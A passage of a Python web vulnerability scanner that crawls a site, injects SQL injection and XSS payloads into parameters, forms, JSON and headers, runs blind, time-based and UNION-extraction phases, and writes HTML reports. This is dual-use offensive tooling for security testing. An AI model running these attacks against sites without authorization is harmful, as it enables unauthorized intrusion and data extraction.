        <thead><tr><th>URL</th><th>Param/Key</th><th>Type</th><th>Severity</th><th>Payload</th><th>Evidence</th><th>Recommendations</th><th>Open</th></tr></thead>
        <tbody>{''.join(row(f) for f in sqli) or '<tr><td colspan="8">No SQLi findings.</td></tr>'}</tbody>
      </table>
    </div>
  </div>

  <div class="card" id="xss">
    <h2>XSS Findings </h2>
    <div style="overflow:auto; max-height:60vh;">
      <table>
        <thead><tr><th>URL</th><th>Param/Key</th><th>Type</th><th>Severity</th><th>Payload</th><th>Evidence</th><th>Recommendations</th><th>Open</th></tr></thead>
        <tbody>{''.join(row(f) for f in xss) or '<tr><td colspan="8">No XSS findings.</td></tr>'}</tbody>
      </table>
    </div>
  </div>

  </div>

  <div class="card">
    <div class="meta" style="color:#6b7280">
      Note: SQLi classification/severity/recommendations are generated by Phase 7 in <span class="mono">sqli_part.py</span> only.
      XSS entries may include Phase 12 exploitability status based on CSP/security headers.
    </div>
  </div>

</div>
</body>
</html>"""

    try:
        with open(output_file, "w", encoding="utf-8") as f:
            f.write(html_doc)
        log(f"[REPORT] FULL HTML report generated: {output_file}")
    except Exception as e:
        log(f"[ERROR] Could not write FULL HTML report: {e}")


# -------------------------
# Core single attempt
# -------------------------
def _single_injection_attempt(method, url, param_name, original_params, base_text, base_status,
                              payload, post_data=None, headers=None, json_body=None, json_key=None,
                              verbose=False, fingerprint=None, session=None, request_fn=None):

    req = request_fn or (lambda m, u, **kw: request_with_timeout(m, u, session=session, **kw))

    if json_body is not None and json_key is not None:
        jb = deepcopy(json_body)
        jb[json_key] = payload
        r = req(method, url, headers=headers, json_body=jb)
        test_url = url
        injected_key = json_key

    else:
        injected_key = param_name if param_name is not None else "_scantest"

        # POST form-data => ALWAYS inject into body
        if method.upper() == "POST" and post_data is not None:
            pd = deepcopy(post_data or {})
            pd[injected_key] = payload
            r = req("POST", url, data=pd, headers=headers)
            test_url = url

        else:
            params_copy = deepcopy(original_params) if original_params else {}
            params_copy[injected_key] = [payload]

            parsed = urlparse(url)
            query = urlencode({k: v[0] for k, v in params_copy.items()}, doseq=False)
            new_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, query, parsed.fragment))

            if method.upper() == "POST":
                r = req("POST", new_url, data=post_data, headers=headers)
                test_url = new_url
            else:
                r = req("GET", new_url, headers=headers)
                test_url = new_url

    if r is None:
        if verbose:
            log(f"[DEBUG] Request failed for payload on {url}: param/key={injected_key}")
        return None

    text = r.text or ""
    status = r.status_code

    sqlerr = sqli_part.is_sql_error(text)

    # ✅ improved reflected check
    reflected = is_reflected_payload(text, payload)

    len_ratio = length_change_ratio(normalize_response(base_text), normalize_response(text))

    vuln_type = None
    reasons = []
    phase = None

    exploit_status = None
    phase12_extra = {}

    if sqlerr:
        vuln_type = "SQLi"
        phase = "error"
        reasons.append("SQL error pattern")

    # keep your original logic: only treat as XSS if payload is from XSS_PAYLOADS
    if reflected and payload in xss_part.XSS_PAYLOADS:
        vuln_type = "XSS"
        reasons.append("payload reflected")
        exploit_status, phase12_extra = _phase12_enrich_xss_fields(getattr(r, "headers", {}) or {})

    if len_ratio > LENGTH_DIFF_THRESHOLD and status == base_status and not vuln_type:
        vuln_type = "SQLi"
        phase = "heuristic"
        reasons.append(f"heuristic length-based SQLi ({len_ratio*100:.1f}%)")

    if not vuln_type:
        return None

    verify_result = {"verified": False, "evidence": "", "score_delta": 0, "elapsed": 0.0}
    if AUTO_VERIFY:
        try:
            verify_result = verify_vuln(
                method=method,
                url=url,
                param_name=param_name,
                original_params=original_params,
                post_data=post_data,
                headers=headers,
                json_body=json_body,
                json_key=json_key,
                base_text=base_text,
                detected_type=("SQLi" if vuln_type == "SQLi" else ("XSS" if vuln_type == "XSS" else vuln_type)),
                fingerprint=fingerprint,
                request_fn=req
            )
        except Exception:
            verify_result = {"verified": False, "evidence": "verify exception", "score_delta": 0, "elapsed": 0.0}

    score = compute_score(base_confidence=10, fingerprint=fingerprint, verify_result=verify_result, payload=payload)
    status_label = "confirmed" if verify_result.get("verified") and score >= 50 else ("probable" if score >= 30 else "low")

    finding = {
        "timestamp": now_ts(),
        "url": url,
        "test_url": test_url,
        "method": method.upper(),
        "injected_param": injected_key,
        "payload": payload,
        "vuln_type": vuln_type,
        "reason": "; ".join(reasons),
        "status_code": status,
        "auto_verified": bool(verify_result.get("verified")),
        "verify": verify_result,
        "fingerprint": fingerprint or {},
        "score": score,
        "status": status_label,
        "base_len": len(base_text or ""),
        "resp_len": len(text or "")
    }

    if phase:
        finding["phase"] = phase

    if vuln_type == "XSS":
        finding["category"] = "XSS"
        finding["xss_subtype"] = "reflected"
        finding["report_type"] = "Reflected XSS"

        if exploit_status:
            finding["exploit_status"] = exploit_status
        if phase12_extra:
            finding.setdefault("extra", {})
            finding["extra"].update(phase12_extra)

    finding["severity"] = finding.get("severity") or _severity_for_finding_scanner(finding)

    msg = f"[VULN] {vuln_type} on {url} param/key '{finding['injected_param']}' payload: {payload} -- {finding['reason']} (score={score})"
    if finding["auto_verified"]:
        msg += " [AUTO-VERIFIED]"
    if vuln_type == "XSS" and finding.get("exploit_status"):
        msg += f" [STATUS: {finding.get('exploit_status')}]"
        csp_lvl = (finding.get("extra") or {}).get("csp_level")
        if csp_lvl:
            msg += f" [CSP={csp_lvl}]"

    log(msg)
    return finding


def test_inject_all_params(method, url, params, payloads, base_text, base_status,
                           post_data=None, headers=None, verbose=False, fingerprint=None,
                           session=None, request_fn=None):
    findings = []
    parsed = urlparse(url)
    req = request_fn or (lambda m, u, **kw: request_with_timeout(m, u, session=session, **kw))

    for payload in payloads:
        params_all = {k: [payload] for k in params.keys()}
        query = urlencode({k: v[0] for k, v in params_all.items()}, doseq=False)
        new_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, query, parsed.fragment))

        r = req("GET" if method.upper() == "GET" else "POST", new_url, data=post_data, headers=headers)
        if r is None:
            if verbose:
                log(f"[DEBUG] All-params request failed for payload: {payload}")
            continue

        text = r.text or ""
        status = r.status_code

        sqlerr = sqli_part.is_sql_error(text)

        # ✅ improved reflected check for any XSS payload
        reflected_xss = any(is_reflected_payload(text, pl) for pl in xss_part.XSS_PAYLOADS)

        len_ratio = length_change_ratio(normalize_response(base_text), normalize_response(text))

        exploit_status = None
        phase12_extra = {}

        if sqlerr or reflected_xss or (len_ratio > LENGTH_DIFF_THRESHOLD and status == base_status):
            if sqlerr:
                vuln_type = "SQLi"
                phase = "error"
            elif reflected_xss:
                vuln_type = "XSS"
                phase = None
                exploit_status, phase12_extra = _phase12_enrich_xss_fields(getattr(r, "headers", {}) or {})
            else:
                vuln_type = "Possible Multi-Param Injection"
                phase = None

            verify_result = {"verified": False, "evidence": "", "score_delta": 0, "elapsed": 0.0}
            if AUTO_VERIFY:
                try:
                    verify_result = verify_vuln(
                        method, url, None, params, post_data, headers,
                        base_text=base_text,
                        detected_type=("SQLi" if vuln_type == "SQLi" else ("XSS" if vuln_type == "XSS" else vuln_type)),
                        fingerprint=fingerprint,
                        request_fn=req
                    )
                except Exception:
                    verify_result = {"verified": False, "evidence": "verify exception", "score_delta": 0, "elapsed": 0.0}

            score = compute_score(base_confidence=10, fingerprint=fingerprint, verify_result=verify_result, payload=payload)

            f = {
                "timestamp": now_ts(),
                "url": url,
                "test_url": new_url,
                "method": method.upper(),
                "injected_param": ",".join(params.keys()),
                "payload": payload,
                "vuln_type": vuln_type,
                "reason": f"all params set to payload; sqlerr={sqlerr}; xss_reflect={reflected_xss}; len_change={len_ratio:.2f}",
                "status_code": status,
                "auto_verified": bool(verify_result.get("verified")),
                "verify": verify_result,
                "fingerprint": fingerprint or {},
                "score": score,
                "status": "confirmed" if verify_result.get("verified") and score >= 50 else ("probable" if score >= 30 else "low"),
            }
            if phase:
                f["phase"] = phase

            if vuln_type == "XSS":
                f["category"] = "XSS"
                f["xss_subtype"] = "reflected"
                f["report_type"] = "Reflected XSS"

                if exploit_status:
                    f["exploit_status"] = exploit_status
                if phase12_extra:
                    f.setdefault("extra", {})
                    f["extra"].update(phase12_extra)

            f["severity"] = f.get("severity") or _severity_for_finding_scanner(f)

            findings.append(f)

            msg = f"[VULN] Multi-param {vuln_type} on {url} payload: {payload} -- len_change={len_ratio:.2f} (score={score})"
            if vuln_type == "XSS" and f.get("exploit_status"):
                msg += f" [STATUS: {f.get('exploit_status')}]"
                csp_lvl = (f.get("extra") or {}).get("csp_level")
                if csp_lvl:
                    msg += f" [CSP={csp_lvl}]"
            log(msg)

    return findings


# -------------------------
# Crawling helpers (updated: use session)
# -------------------------
JS_ENDPOINT_RE = re.compile(r'["\'](/rest/[a-zA-Z0-9_/\-?=&]+)["\']')

def is_same_domain(base_url, target_url):
    try:
        base_netloc = urlparse(base_url).netloc
        target_netloc = urlparse(target_url).netloc
        return base_netloc == target_netloc or target_netloc == ""
    except Exception:
        return False

def discover_endpoints_from_js(base_url, soup, headers=None, session=None):
    endpoints = []
    s = session or requests

    for script in soup.find_all("script", src=True):
        src = script.get("src")
        if not src:
            continue
        js_url = urljoin(base_url, src)
        try:
            resp = s.get(js_url, headers=headers, timeout=TIMEOUT, allow_redirects=True)
        except Exception:
            continue
        if not resp or resp.status_code != 200:
            continue

        text = resp.text or ""
        for m in JS_ENDPOINT_RE.finditer(text):
            path = m.group(1)
            full = urljoin(base_url, path)
            endpoints.append(full)

    seen = set()
    uniq = []
    for u in endpoints:
        if u not in seen:
            uniq.append(u)
            seen.add(u)
    return uniq

def add_dummy_param(url):
    parsed = urlparse(url)
    q = parse_qs(parsed.query)

    for k in q.keys():
        if k.startswith("_scnp_"):
            return url

    rnd = random.randint(10, 99)
    dummy_key = f"_scnp_{rnd}"
    q[dummy_key] = ["1"]

    new_q = urlencode({k: v[0] for k, v in q.items()}, doseq=False)
    return urlunparse(parsed._replace(query=new_q))

def crawl_site(base_url, max_depth=2, max_pages=100, headers=None, session=None):
    visited = set()
    discovered = []
    queue = deque()
    queue.append((add_dummy_param(base_url), 0))

    s = session or requests

    log(f"[*] Crawling start: {base_url} (depth={max_depth}, max_pages={max_pages})")

    while queue and len(discovered) < max_pages:
        url, depth = queue.popleft()
        url = add_dummy_param(url)

        if url in visited:
            continue
        visited.add(url)

        if depth > max_depth:
            continue

        try:
            resp = s.get(url, headers=headers, timeout=TIMEOUT, allow_redirects=True)
        except Exception:
            continue

        content_type = resp.headers.get("Content-Type", "")
        discovered.append(url)

        if "text/html" not in content_type.lower():
            continue

        if len(discovered) >= max_pages:
            break

        try:
            soup = BeautifulSoup(resp.text, "html.parser")
        except Exception:
            continue

        for a in soup.find_all("a", href=True):
            href = a.get("href")
            if not href:
                continue
            full_url = add_dummy_param(urljoin(url, href))
            if is_same_domain(base_url, full_url) and full_url not in visited:
                queue.append((full_url, depth + 1))

        for form in soup.find_all("form"):
            action = form.get("action") or url
            method = (form.get("method") or "GET").upper()
            form_url = urljoin(url, action)

            fparams = {}
            for inp in form.find_all("input"):
                name = inp.get("name")
                if name:
                    fparams[name] = "1"

            if method == "GET":
                if fparams:
                    q = urlencode(fparams)
                    full_url = form_url + ("&" if "?" in form_url else "?") + q
                else:
                    full_url = form_url

                full_url = add_dummy_param(full_url)

                if is_same_domain(base_url, full_url) and full_url not in visited:
                    queue.append((full_url, depth + 1))

        js_eps = discover_endpoints_from_js(base_url, soup, headers=headers, session=session)
        for ep in js_eps:
            ep = add_dummy_param(ep)
            if is_same_domain(base_url, ep) and ep not in visited:
                queue.append((ep, depth + 1))

    unique = []
    seen = set()
    for u in discovered:
        if u not in seen:
            unique.append(u)
            seen.add(u)

    log(f"[*] Crawling finished: discovered {len(unique)} URLs")
    return unique


# -------------------------
# scan_target
# -------------------------
def scan_target(
    url,
    method="GET",
    postdata_str=None,
    headers=None,
    session=None,
    json_str=None,
    headers_inject=False,
    inject_all_params_flag=False,
    combined_payloads=None,
    verbose=False,
    threads=1,
    payloads_categories=None,
    time_sqli=False,
    time_delay=5,
    time_threshold=4.0,
    time_samples=3,
    union_extract=False,
    xss_context=False,
    active_fp=False,
    xss_advanced=False,
    dom_xss=False,
    stored_xss=False,
    stored_wait=2.0,
    discovered_urls=None
):
    log(f"--- Scanning: {url} (method={method}) ---")

    def req(method_, url_, **kwargs):
        kwargs.pop("session", None)
        return request_with_timeout(method_, url_, session=session, **kwargs)

    parsed = urlparse(url)
    params = parse_qs(parsed.query)

    post_data = None
    if postdata_str:
        post_data = {}
        for kv in postdata_str.split("&"):
            if "=" in kv:
                k, v = kv.split("=", 1)
                post_data[k] = v

    json_body = None
    if json_str:
        try:
            json_body = json.loads(json_str)
        except Exception as e:
            log(f"[ERROR] bad --json for {url}: {e}")

    effective_params = params
    if method.upper() == "POST" and post_data:
        effective_params = {k: [v] for k, v in post_data.items()}

    base_status, base_text_raw, base_headers = baseline_response(
        method, url, headers=headers, json_body=json_body, data=post_data, session=session
    )
    if base_status is None:
        log(f"[ERROR] Baseline request failed (no response): {url}")
        return []

    if base_status in (401, 403):
        log(f"[INFO] Baseline returned {base_status} (auth-protected endpoint) – continuing scan")

    base_text = normalize_response(base_text_raw)

    fingerprint = fingerprint_response(base_text_raw, base_headers)
    if verbose:
        log(f"[INFO] Fingerprint for {url}: {fingerprint}")

    try:
        if active_fp and method.upper() == "GET" and params:
            db_guess, ev = sqli_part.active_db_fingerprint(
                method, url, params,
                request_with_timeout=req,
                headers=headers,
                verbose=verbose,
                log=log
            )
            if db_guess:
                old_db = fingerprint.get("database")
                fingerprint["database"] = db_guess
                fingerprint.setdefault("evidence", []).extend(ev)
                if verbose:
                    log(f"[ACTIVE-FP] database updated from {old_db} to {db_guess}")
    except Exception as e:
        if verbose:
            log(f"[DEBUG] Active fingerprinting error on {url}: {e}")

    if combined_payloads:
        payloads = combined_payloads
    elif payloads_categories:
        payloads = choose_payloads_from_categories(fingerprint, payloads_categories)
        if verbose:
            log(f"[*] Using categorized payloads ({len(payloads)})")
    else:
        payloads = choose_payloads(fingerprint)

    findings_total = []

    # Phase 11 Stored XSS
    try:
        if stored_xss and base_text_raw and method.upper() == "GET":
            ctype = (base_headers or {}).get("Content-Type", "")
            is_html = ("text/html" in (ctype or "").lower()) or ("<html" in base_text_raw.lower())
            if is_html:
                if hasattr(xss_part, "run_stored_xss_phase") and hasattr(xss_part, "guess_view_pages"):
                    sess = session or requests.Session()
                    if headers:
                        sess.headers.update(headers)

                    view_urls = xss_part.guess_view_pages(discovered_urls or [url], url)
                    stored_findings = xss_part.run_stored_xss_phase(
                        session=sess,
                        input_page_url=url,
                        input_html=base_text_raw,
                        candidate_view_urls=view_urls,
                        wait_sec=float(stored_wait or 2.0),
                        log=log,
                        verbose=verbose,
                        now_ts=now_ts
                    )
                    if stored_findings:
                        for sf in stored_findings:
                            if isinstance(sf, dict):
                                sf.setdefault("vuln_type", "XSS")
                                sf["category"] = "XSS"
                                sf["xss_subtype"] = "stored"
                                sf["report_type"] = "Stored XSS"

                                sf.setdefault("url", sf.get("input_url", url))
                                sf.setdefault("test_url", sf.get("view_url", url))
                                sf.setdefault("injected_param", ",".join(sf.get("input_fields", [])) or "[FORM]")
                                sf.setdefault("payload", sf.get("payload", ""))
                                sf.setdefault("status", "confirmed")
                                sf.setdefault("score", 80)
                                sf.setdefault("fingerprint", fingerprint or {})
                                sf.setdefault("auto_verified", True)
                                sf.setdefault("verify", {"verified": True, "evidence": sf.get("reason","stored marker found"), "score_delta": 50, "elapsed": 0.0})
                                sf.setdefault("phase", "stored")
                                sf["severity"] = "High"
                        findings_total.extend(stored_findings)
                else:
                    log("[WARN] Stored XSS enabled but xss_part missing (run_stored_xss_phase/guess_view_pages). Skipping Phase 11.")
    except Exception as e:
        if verbose:
            log(f"[DEBUG] Stored XSS phase error on {url}: {e}")

    # Phase 10 DOM XSS
    try:
        if dom_xss and base_text_raw:
            ctype = (base_headers or {}).get("Content-Type", "")
            if "text/html" in ctype.lower() or "<html" in base_text_raw.lower():
                dom_findings = xss_part.run_dom_xss_phase(
                    url=url,
                    base_html=base_text_raw,
                    TIMEOUT=TIMEOUT,
                    headers=headers,
                    fingerprint=fingerprint,
                    compute_score=compute_score,
                    log=log,
                    now_ts=now_ts,
                    verbose=verbose,
                    session=session
                )
                for df in dom_findings or []:
                    if isinstance(df, dict):
                        df.setdefault("vuln_type", "XSS")
                        df["category"] = "XSS"
                        df["xss_subtype"] = "dom"
                        df["report_type"] = "DOM XSS"
                        df.setdefault("phase", "dom")
                        df["severity"] = df.get("severity") or _severity_for_finding_scanner(df)
                findings_total.extend(dom_findings or [])
    except Exception as e:
        if verbose:
            log(f"[DEBUG] DOM XSS phase error on {url}: {e}")

    # Phase 1 Blind SQLi (GET only)
    try:
        if method.upper() == "GET" and params:
            blind_phase = sqli_part.BlindBooleanSQLiPhase(
                request_with_timeout=req,
                normalize_response=normalize_response,
                now_ts=now_ts,
                compute_score=compute_score,
                log=log,
                retries=3,
                length_diff_ratio=0.15,
                similarity_threshold=0.97
            )
            blind_findings = blind_phase.run_for_url(method, url, headers=headers, fingerprint=fingerprint)
            for bf in blind_findings or []:
                if isinstance(bf, dict):
                    bf["severity"] = bf.get("severity") or _severity_for_finding_scanner(bf)
            findings_total.extend(blind_findings or [])
    except Exception as e:
        if verbose:
            log(f"[DEBUG] Blind SQLi phase error on {url}: {e}")

    # Phase 2 Time-based SQLi
    try:
        if time_sqli and effective_params:
            time_findings = sqli_part.run_time_based_sqli_phase(
                method, url, effective_params, headers, json_body, post_data,
                fingerprint, time_delay, time_threshold, time_samples,
                request_with_timeout=req,
                compute_score=compute_score,
                log=log,
                now_ts=now_ts,
                verbose=verbose
            )
            for tf in time_findings or []:
                if isinstance(tf, dict):
                    tf["severity"] = tf.get("severity") or _severity_for_finding_scanner(tf)
            findings_total.extend(time_findings or [])
    except Exception as e:
        if verbose:
            log(f"[DEBUG] Time-based SQLi phase error on {url}: {e}")

    # Phase 3b UNION extract (GET only)
    try:
        if union_extract and method.upper() == "GET" and params:
            union_findings = sqli_part.run_union_extraction_phase(
                method, url, params, headers, fingerprint,
                base_status=base_status,
                base_text_raw=base_text_raw,
                request_with_timeout=req,
                normalize_response=normalize_response,
                length_change_ratio=length_change_ratio,
                compute_score=compute_score,
                log=log,
                now_ts=now_ts,
                verbose=verbose
            )
            for uf in union_findings or []:
                if isinstance(uf, dict):
                    uf["severity"] = uf.get("severity") or _severity_for_finding_scanner(uf)
            findings_total.extend(union_findings or [])
    except Exception as e:
        if verbose:
            log(f"[DEBUG] UNION phase error on {url}: {e}")

    # Phase 8 Context-aware XSS
    try:
        if xss_context and effective_params:
            ctx_findings = xss_part.run_context_aware_xss_phase(
                method, url, effective_params, headers, json_body, post_data,
                base_status, base_text, verbose,
                fingerprint,
                request_with_timeout=req,
                _single_injection_attempt=_single_injection_attempt,
                log=log
            )
            for xf in ctx_findings or []:
                if isinstance(xf, dict):
                    xf = normalize_xss_finding(xf)
                    xf["severity"] = xf.get("severity") or _severity_for_finding_scanner(xf)
            findings_total.extend(ctx_findings or [])
    except Exception as e:
        if verbose:
            log(f"[DEBUG] Context-aware XSS phase error on {url}: {e}")

    # Phase 9 Advanced reflected XSS
    try:
        if xss_advanced and effective_params:
            adv_findings = xss_part.run_advanced_reflected_xss_phase(
                method, url, effective_params, headers,
                base_text_raw=base_text_raw,
                fingerprint=fingerprint,
                request_with_timeout=req,
                compute_score=compute_score,
                log=log,
                now_ts=now_ts,
                verbose=verbose
            )
            for af in adv_findings or []:
                if isinstance(af, dict):
                    af.setdefault("category", "XSS")
                    af.setdefault("xss_subtype", "reflected")
                    af.setdefault("report_type", "Reflected XSS")
                    af["severity"] = af.get("severity") or _severity_for_finding_scanner(af)
            findings_total.extend(adv_findings or [])
    except Exception as e:
        if verbose:
            log(f"[DEBUG] Advanced reflected XSS phase error on {url}: {e}")

    header_variants = [headers] if headers is not None else [None]
    if headers_inject:
        header_variants = generate_header_variants(headers, payloads)

    tasks = []

    def add_param_payload_tasks(hdr, p_name, orig_params, jb=None, jkey=None):
        for pl in payloads:
            tasks.append((
                "param",
                dict(
                    method=method,
                    url=url,
                    param_name=p_name,
                    original_params=orig_params,
                    base_text=base_text,
                    base_status=base_status,
                    payload=pl,
                    post_data=post_data,
                    headers=hdr,
                    json_body=jb,
                    json_key=jkey,
                    verbose=verbose,
                    fingerprint=fingerprint,
                    session=session,
                    request_fn=req
                )
            ))

    for hdr in header_variants:
        if json_body:
            for key in list(json_body.keys()):
                add_param_payload_tasks(hdr, None, {}, jb=json_body, jkey=key)
        else:
            if effective_params:
                for pname in effective_params.keys():
                    add_param_payload_tasks(hdr, pname, effective_params)
                if inject_all_params_flag and method.upper() == "GET":
                    tasks.append((
                        "allparams",
                        dict(
                            method=method,
                            url=url,
                            params=effective_params,
                            payloads=payloads,
                            base_text=base_text,
                            base_status=base_status,
                            post_data=post_data,
                            headers=hdr,
                            verbose=verbose,
                            fingerprint=fingerprint,
                            session=session,
                            request_fn=req
                        )
                    ))
            else:
                test_param = "_scntest"
                add_param_payload_tasks(hdr, test_param, {test_param: ["1"]})

    max_workers = max(1, int(threads or 1))
    if max_workers == 1:
        for kind, kwargs in tasks:
            if kind == "param":
                f = _single_injection_attempt(**kwargs)
                if f:
                    findings_total.append(f)
            else:
                findings_total.extend(test_inject_all_params(**kwargs))
    else:
        with ThreadPoolExecutor(max_workers=max_workers) as ex:
            futures = []
            for kind, kwargs in tasks:
                if kind == "param":
                    futures.append(ex.submit(_single_injection_attempt, **kwargs))
                else:
                    futures.append(ex.submit(test_inject_all_params, **kwargs))
            for fut in as_completed(futures):
                try:
                    res = fut.result()
                    if isinstance(res, list):
                        findings_total.extend(res)
                    elif res:
                        findings_total.append(res)
                except Exception as e:
                    if verbose:
                        log(f"[DEBUG] task error: {e}")

    if not findings_total:
        log(f"[OK] No issues detected (basic heuristics) for: {url}")

    return findings_total


# -------------------------
# File targets / payload file
# -------------------------
def load_targets_from_file(path):
    try:
        with open(path, "r", encoding="utf-8") as f:
            return [l.strip() for l in f if l.strip()]
    except Exception as e:
        print("Error reading file:", e)
        return []

def load_payloads_file(path):
    try:
        with open(path, "r", encoding="utf-8") as f:
            lines = [l.strip() for l in f if l.strip() and not l.strip().startswith("#")]
        return lines
    except Exception as e:
        log(f"[ERROR] Could not read payloads file {path}: {e}")
        return []


# -------------------------
# CLI
# -------------------------
def build_argparser():
    parser = argparse.ArgumentParser(
        description="SQLi/XSS scanner (Core) using sqli_part + xss_part"
    )
    group = parser.add_mutually_exclusive_group(required=True)
    group.add_argument("--url", "-u", help="Base target URL to scan (can be combined with --crawl)")
    group.add_argument("--file", help="File with list of target URLs (one per line)")
    parser.add_argument("--cookies", help="Cookies string, e.g. session=abc123; role=user")

    parser.add_argument("--method", "-m", choices=["GET", "POST"], default="GET")
    parser.add_argument("--postdata", default=None, help="POST data as key=value&k2=v2")
    parser.add_argument("--json", default=None, help='POST JSON body as a JSON string, e.g. \'{"q":"test"}\'')
    parser.add_argument("--headers", default=None, help="Extra headers as key1:val1|key2:val2")

    parser.add_argument("--timeout", type=int, default=10)
    parser.add_argument("--verbose", action="store_true")

    parser.add_argument("--headers-inject", action="store_true")
    parser.add_argument("--inject-all-params", dest="inject_all_params", action="store_true")

    parser.add_argument("--payloads", type=str, help="Path to payload file (one payload per line).")
    parser.add_argument("--payloads-json", type=str, help="Path to JSON payload categories (keys: boolean,time,error,xss)")

    parser.add_argument("--report-json", default="report.json")
    parser.add_argument("--report-txt", default="report.txt")

    parser.add_argument("--report-html", action="store_true", help="Generate SQLi HTML report (Phase 7)")
    parser.add_argument("--report-html-out", default="sqli_report.html", help="SQLi HTML report output file")

    parser.add_argument("--report-all-html", action="store_true", help="Generate FULL HTML report (SQLi + XSS + Heuristics)")
    parser.add_argument("--report-all-out", default="full_report.html", help="Full HTML report output file")

    parser.add_argument("--threads", type=int, default=1)
    parser.add_argument("--delay", type=float, default=0.0)
    parser.add_argument("--auto-verify", action="store_true")

    parser.add_argument("--len-threshold", type=float, default=0.30)

    parser.add_argument("--crawl", action="store_true")
    parser.add_argument("--crawl-depth", type=int, default=2)
    parser.add_argument("--max-pages", type=int, default=100)
    parser.add_argument("--save-discovered", action="store_true")

    parser.add_argument("--time-sqli", action="store_true")
    parser.add_argument("--time-delay", type=int, default=5)
    parser.add_argument("--time-threshold", type=float, default=4.0)
    parser.add_argument("--time-samples", type=int, default=3)
    parser.add_argument("--union-extract", action="store_true")
    parser.add_argument("--active-fp", action="store_true")

    parser.add_argument("--xss-context", action="store_true")
    parser.add_argument("--xss-advanced", action="store_true")
    parser.add_argument("--dom-xss", action="store_true")

    parser.add_argument("--stored-xss", action="store_true", help="Enable Stored XSS Engine (Phase 11)")
    parser.add_argument("--stored-wait", type=float, default=2.0, help="Wait seconds after submitting stored payloads (default: 2.0)")

    return parser

def parse_cookies(cookie_str):
    cookies = {}
    if not cookie_str:
        return cookies
    for part in cookie_str.split(";"):
        if "=" in part:
            k, v = part.split("=", 1)
            cookies[k.strip()] = v.strip()
    return cookies

def main():
    global TIMEOUT, REPORT_FILE, REPORT_JSON, AUTO_VERIFY, RATE_LIMITER, LENGTH_DIFF_THRESHOLD
    global REPORT_HTML_ENABLED, REPORT_HTML_FILE
    global REPORT_ALL_HTML_ENABLED, REPORT_ALL_HTML_FILE

    parser = build_argparser()
    args = parser.parse_args()

    TIMEOUT = int(args.timeout)
    REPORT_FILE = args.report_txt
    REPORT_JSON = args.report_json
    AUTO_VERIFY = bool(args.auto_verify)
    RATE_LIMITER = RateLimiter(args.delay or 0.0)
    LENGTH_DIFF_THRESHOLD = float(args.len_threshold if args.len_threshold is not None else 0.30)

    REPORT_HTML_ENABLED = bool(args.report_html)
    REPORT_HTML_FILE = args.report_html_out or "sqli_report.html"

    REPORT_ALL_HTML_ENABLED = bool(args.report_all_html)
    REPORT_ALL_HTML_FILE = args.report_all_out or "full_report.html"

    hdrs = {}
    if args.headers:
        for kv in args.headers.split("|"):
            if ":" in kv:
                k, v = kv.split(":", 1)
                hdrs[k.strip()] = v.strip()

    session = requests.Session()
    if hdrs:
        session.headers.update(hdrs)
    if args.cookies:
        session.cookies.update(parse_cookies(args.cookies))

    combined_payloads = None
    payloads_categories = None

    if args.payloads:
        pl = load_payloads_file(args.payloads)
        if pl:
            combined_payloads = pl
            log(f"[*] Loaded {len(pl)} payloads from {args.payloads}")

    if args.payloads_json and not combined_payloads:
        payloads_categories = load_payloads_json(args.payloads_json)
        if payloads_categories:
            flat_count = sum(len(v) for v in payloads_categories.values())
            log(f"[*] Loaded categorized payloads ({flat_count}) from {args.payloads_json}")

    open(REPORT_FILE, "w", encoding="utf-8").close()

    targets = []
    if args.url:
        if args.crawl:
            targets = crawl_site(
                args.url,
                max_depth=args.crawl_depth,
                max_pages=args.max_pages,
                headers=hdrs,
                session=session
            )
            if args.save_discovered and targets:
                try:
                    with open("discovered_urls.txt", "w", encoding="utf-8") as f:
                        for u in targets:
                            f.write(u + "\n")
                    log("[*] Discovered URLs saved to discovered_urls.txt")
                except Exception as e:
                    log(f"[ERROR] Could not save discovered URLs: {e}")
        else:
            targets = [args.url]
    else:
        targets = load_targets_from_file(args.file)

    if not targets:
        log("[!] No targets to scan (empty list).")
        return

    all_findings = []
    start = time.time()

    for t in targets:
        try:
            f = scan_target(
                t,
                method=args.method,
                postdata_str=args.postdata,
                headers=hdrs,
                session=session,
                json_str=args.json,
                headers_inject=args.headers_inject,
                inject_all_params_flag=args.inject_all_params,
                combined_payloads=combined_payloads,
                verbose=args.verbose,
                threads=args.threads,
                payloads_categories=payloads_categories,
                time_sqli=args.time_sqli,
                time_delay=args.time_delay,
                time_threshold=args.time_threshold,
                time_samples=args.time_samples,
                union_extract=args.union_extract,
                xss_context=args.xss_context,
                active_fp=args.active_fp,
                xss_advanced=args.xss_advanced,
                dom_xss=args.dom_xss,
                stored_xss=args.stored_xss,
                stored_wait=args.stored_wait,
                discovered_urls=targets
            )
            all_findings.extend(f or [])
        except KeyboardInterrupt:
            print("Interrupted by user")
            break
        except Exception as e:
            log(f"[DEBUG] target error: {e}")

    elapsed = time.time() - start

    # -------------------------
    # DEDUP + Enrich + Aggregation
    # -------------------------
    all_findings = [f for f in all_findings if isinstance(f, dict)]

    # 0) Normalize XSS labels BEFORE dedup/summary so report.json shows Stored/DOM
    all_findings = normalize_all_findings(all_findings)

    # ✅ Ensure labeling is applied for any XSS-like finding (hard guarantee)
    for f in all_findings:
        if _is_xss_finding(f):
            normalize_xss_finding(f)

    # 1) Dedup
    uniq, removed = dedup_findings(all_findings)
    all_findings = uniq
    if removed:
        log(f"[*] Dedup removed {removed} duplicate findings")

    # 2) SQLi enrichment (Phase 7 from sqli_part.py)
    try:
        sqli_only = [f for f in all_findings if _is_sqli_finding(f)]
        enriched_sqli = sqli_part.enrich_sqli_findings_list(sqli_only)

        def _key(d):
            return (d.get("url"), d.get("injected_param"), d.get("payload"), d.get("test_url"), d.get("phase"))

        enriched_map = {_key(x): x for x in enriched_sqli if isinstance(x, dict)}

        for i, f in enumerate(all_findings):
            if not isinstance(f, dict):
                continue
            k = _key(f)
            if k in enriched_map:
                all_findings[i].update(enriched_map[k])
    except Exception as e:
        log(f"[DEBUG] Phase7 enrich failed: {e}")

    # 2.5) Normalize again (in case enrichment overwrote fields)
    all_findings = normalize_all_findings(all_findings)

    # ✅ Ensure labeling again after enrichment (hard guarantee)
    for f in all_findings:
        if _is_xss_finding(f):
            normalize_xss_finding(f)

    # 3) Ensure severity on all + page aggregation
    for f in all_findings:
        if "severity" not in f or not f.get("severity"):
            f["severity"] = _severity_for_finding_scanner(f)

    pages = aggregate_page_risk(all_findings)
    summary = compute_summary(all_findings)

